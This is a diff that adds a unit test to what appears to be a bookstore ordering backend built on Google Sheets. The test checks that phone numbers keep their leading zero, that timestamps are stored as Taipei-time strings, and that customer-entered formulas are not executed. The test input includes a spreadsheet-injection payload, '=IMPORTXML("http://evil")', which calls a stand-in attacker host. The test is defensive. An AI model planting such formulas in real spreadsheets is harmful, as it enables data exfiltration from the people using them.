@@ -114,6 +114,21 @@ test('庫存不足整張單拒絕，其他書的庫存也不能被扣', () => {
   assert.strictEqual(rows(g, 'orders').length, 0);
 });
 
+test('Sheet 自動轉型：電話保留開頭 0、時間是台北時間字串、客人輸入的公式不會被執行', () => {
+  const g = fresh();
+  const r = g.Store.createOrder(order({ phone: '0900000000', note: '=IMPORTXML("http://evil")' }));
+  const o = g.Store.getOrder(r.order.order_id);
+  assert.strictEqual(o.phone, '0900000000');
+  assert.match(String(o.created_at), /^\d{4}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2}$/);
+  assert.strictEqual(o.note, '=IMPORTXML("http://evil")');
+  assert.strictEqual(typeof o.note, 'string');
+  // 後台「今日訂單」靠 created_at 字串比對日期
+  const token = post(g, { source: 'web', action: 'login', password: 'secret' }).token;
+  assert.strictEqual(post(g, { source: 'web', action: 'dashboard', token }).stats.todayOrders, 1);
+  // 取消後回補也要能找到這張單
+  assert.ok(g.Store.cancelOrder(r.order.order_id, '0900000000').ok);
+});
+
 test('下單欄位驗證', () => {
   const g = fresh();
   [
